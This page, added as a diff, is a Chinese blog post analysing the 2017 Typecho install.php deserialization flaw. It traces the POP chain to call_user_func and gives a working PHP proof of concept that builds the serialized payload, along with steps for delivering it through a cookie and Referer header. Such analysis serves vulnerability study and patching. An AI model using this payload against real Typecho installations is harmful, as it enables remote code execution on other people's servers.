@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="zh_cn">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="一个孤独散步者的梦">
+
+
+<meta property="twitter:title" content="Typecho install.php 反序列化漏洞分析">
+
+    <meta property="twitter:card" content="summary">
+
+<meta property="twitter:description" content="">
+
+<title>
+
+
+     诗与胡说 - Typecho install.php 反序列化漏洞分析 
+
+</title>
+<link rel="canonical" href="https://kylingit.com/blog/typecho-install.php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<link rel="stylesheet" href="https://kylingit.com/css/main.v0.9.1.css">
+<link rel="stylesheet" href="https://kylingit.com/css/ionicons.min.css">
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/highlight.min.css">
+
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/progressively.min.css">
+
+
+
+
+
+<link rel="shortcut icon"
+
+    href="https://kylingit.com/img/favicon.png"
+
+>
+
+
+
+
+</head>
+
+
+<body>
+
+
+<section class="header">
+
+    <div class="container">
+        <a href="https://kylingit.com/"><img class="logo" src="https://kylingit.com/img/logo.jpg" alt="logo" /></a>
+        <div class="content">
+            <a href="https://kylingit.com/"><div class="name"><h1>诗与胡说</h1></div></a>
+            <nav>
+                <ul>
+                    
+                        <a href="https://kylingit.com/blog/"><li>Blog</li></a>
+                    
+                    
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/about"><li>about</li></a>
+                            
+                        
+                    
+                        
+                            
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/projects"><li>projects</li></a>
+                            
+                        
+                    
+                    
+                        
+                            <a href="https://kylingit.com/notes/"><li>notes</li></a>
+                        
+                    
+                        
+                    
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+
+<section class="main post non-narrow zero-top-spacing">
+    <div class="container">
+        <div class="content">
+            <div class="front-matter">
+                <div class="title-container">
+                    <div class="page-heading">
+
+    Typecho install.php 反序列化漏洞分析
+
+</div>
+
+                </div>
+                <div class="meta">
+                    <div class="date" title="Mon Oct 30 2017 14:32:18 UTC">Oct 30, 2017</div>
+                    <div class="reading-time"><div class="middot"></div>1 minute read</div>
+                </div>
+            </div>
+            <div class="markdown">
+                
+    
+    
+
+<script src="https://ob5vt1k7f.qnssl.com/pangu.js"></script>
+
+<p>正好在学习php代码审计，简单分析一下前几天的<code>Typecho install.php</code>反序列化漏洞</p>
+
+<h3 id="漏洞分析">漏洞分析</h3>
+
+<p>漏洞点出现在<code>install.php</code>第229-235行:</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/Affah" alt="0" />
+这里进行了一个反序列化操作，一般碰到这个都值得注意一下</p>
+
+<p>由于这是初始安装文件，复现时要想流程走到这里就得绕过程序自身的判断，它的判断逻辑如下:</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/fQO9b" alt="1" /></p>
+
+<p>就进行了两个简单的判断，<code>HTTP_REFERER</code>是否为空以及是否来源于本站，这是很容易绕过的</p>
+
+<p>往下执行到<code>unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')))</code>反序列化操作，如果<code>Typecho_Cookie::get('__typecho_config')</code>可控的话就可能导致一个漏洞</p>
+
+<p>跟进<code>Typecho_Cookie</code>类的<code>get()</code>方法分析一下:</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/HW0eV" alt="2" /></p>
+
+<p>可以看到<code>$_COOKIE[$key]</code>的内容都是我们可以控制的，存在风险</p>
+
+<p>继续往下看到
+<code>$db = new Typecho_Db($config['adapter'], $config['prefix']);</code>这里新建了一个<code>Typecho_Db</code>对象，跟进去看一下这个对象的构造方法:</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/yLOrO" alt="3" /></p>
+
+<p>注意这一行<code>$adapterName = 'Typecho_Db_Adapter_' . $adapterName;</code>
+将<code>Typecho_Db_Adapter_</code>属性与字符串进行了拼接，这就涉及到php的一个特性，如果<code>Typecho_Db_Adapter_</code>传入的是一个实例化对象，那将自动触发这个对象的<code>__toString()</code>方法</p>
+
+<p>我们全局搜索<code>__toString()</code>方法，可以在<code>Feed.php</code>的第223行找到一个<code>__toString()</code>方法:</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/nXTJN" alt="4" /></p>
+
+<p>里面进行了3个<code>if</code>判断，注意到第3个<code>if</code>中有这样一句(同样在第2个<code>if</code>中也存在):</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/11MHn" alt="5" /></p>
+
+<p>访问了<code>item</code>元素里的一个属性<code>screenName</code>，这就又涉及到php的一个特性，如果我们访问一个对象的私有属性或者不存在的属性到时候，会自动调用这个对象的<code>__get()</code>方法，所以我们只要找到一个<code>__get()</code>方法并且它的参数可控，那就形成了一条完整的调用链。</p>
+
+<p>全局搜索<code>__get()</code>方法，在<code>Request.php</code>第269行:</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/zcYKG" alt="6" /></p>
+
+<p>继续跟进<code>get</code>，第295行</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/EbE9r" alt="7" /></p>
+
+<p>可以看到自定义的<code>get()</code>方法最终返回的是<code>$this-&gt;_applyFilter($value)</code>，跟进<code>_applyFilter()</code>看一下:</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/tztDS" alt="8" /></p>
+
+<p>注意这里调用了<code>call_user_func()</code>方法，而且这里的两个参数都是可控的，这就形成了一个任意代码执行的漏洞</p>
+
+<p>反过来回顾一下整个流程，构造<code>call_user_func()</code>恶意方法——调用<code>__get()</code>方法——调用<code>__toString()</code>方法——控制传入的类——反序列化</p>
+
+<h3 id="poc">PoC</h3>
+
+<pre><code>&lt;?php
+class Typecho_Feed
+{
+    const ATOM1 = 'ATOM 1.0';
+    private $_type;
+    private $_items;
+	
+    public function __construct(){
+        $this-&gt;_type = $this::ATOM1;
+        $this-&gt;_items[0] = array(
+            'author' =&gt; new Typecho_Request(),
+        );
+    }
+}
+class Typecho_Request
+{
+    private $_params = array();
+    private $_filter = array();
+    public function __construct(){
+        $this-&gt;_params['screenName'] = 'phpinfo()';
+        $this-&gt;_filter[0] = 'assert';
+    }
+}
+$exp = array(
+    'adapter' =&gt; new Typecho_Feed(),
+    'prefix' =&gt; 'test'
+);
+echo base64_encode(serialize($exp));
+?&gt;
+</code></pre>
+
+<p>构造<code>__typecho_config</code>的值等于PoC输出内容，加上<code>referer</code>头信息，发送给<code>http://localhost/install.php?finish=1</code>
+PoC执行流程: base64编码后的序列化内容经过解码后反序列化，传给<code>Typecho_Db</code>构造函数，其中<code>adapter</code>参数是一个<code>Typecho_Feed</code>对象，拼接了字符串会调用<code>__toString()</code>方法，控制可控变量进入第2个if分支，执行到<code>$item['author']-&gt;screenName</code>，当<code>author</code>是一个<code>Typecho_Request</code>对象且没有<code>screenName</code>属性时，会调用<code>__get()</code>方法执行<code>_applyFilter()</code>，进而执行<code>call_user_func</code>，传入<code>assert(phpinfo());</code>执行成功</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/Ple7u" alt="9" /></p>
+
+<p>最后还有一个<code>ob_start()</code>的问题，<code>install.php</code>中开启了这个，</p>
+
+<blockquote>
+<p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。</p>
+</blockquote>
+
+<p>所以会触发异常后导致500，同时输出内容会在缓冲区会清除，@<a href="https://lorexxar.cn/">LoRexxar&rsquo;</a>给出了两个解决办法</p>
+
+<blockquote>
+<p>1、因为<code>call_user_func</code>函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit 跳出，缓冲区中的数据就会被输出出来。</p>
+
+<p>2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。</p>
+</blockquote>
+
+<p>总的来看这个漏洞还是比较经典的，涉及到几个特性和两三层的调用链，至于流传的“后门”说法还是持保留态度，我们还是回归到技术交流本身吧~</p>
+
+<p>参考:</p>
+
+<p><a href="https://paper.seebug.org/424/">Typecho 前台 getshell 漏洞分析</a></p>
+
+<p><a href="http://www.blogsir.com.cn/safe/452.html">POP链和序列化，反序列化操作</a></p>
+
+<script>pangu.spacingPage();</script>
+
+
+                <br>
+                <p><a href="https://kylingit.com/blog">Back to posts</a></p>
+            </div>
+            <br>
+            <div class="disqus">
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'kylingit';
+    var disqus_identifier = 'https:\/\/kylingit.com\/blog\/typecho-install.php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\/';
+    var disqus_title = 'Typecho install.php 反序列化漏洞分析';
+    var disqus_url = 'https:\/\/kylingit.com\/blog\/typecho-install.php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="footer">
+    <div class="container">
+        <div class="copyright">
+
+        
+            <a href="https://kylingit.com/license">Copyright © 2018 kylinking</a>
+        
+
+        </div>
+        <div class="icons">
+
+        
+            <a href="https://github.com/kylingit" target="_blank">
+                <i class="icon ion-social-github" title="github"></i>
+            </a>
+        
+
+        
+
+        
+
+        
+            <a href="mailto:ikylinking@gmail.com">
+                <i class="icon ion-ios-email larger" title="email"></i>
+            </a>
+        
+
+        
+            <a href="https://kylingit.com/index.xml">
+                <i class="icon ion-social-rss larger" title="rss"></i>
+            </a>
+        
+
+        </div>
+    </div>
+</section>
+
+
+  <script src="https://kylingit.com/js/highlight.min.js" defer></script>
+  
+
+
+
+  <script src="https://kylingit.com/js/progressively.min.js" defer></script>
+
+
+<script>
+  window.onload = function() {
+    
+      hljs.initHighlighting();
+    
+    
+      progressively.init({delay: 30, throttle: 50});
+    
+  };
+</script>
+
+</body>
+</html>
+
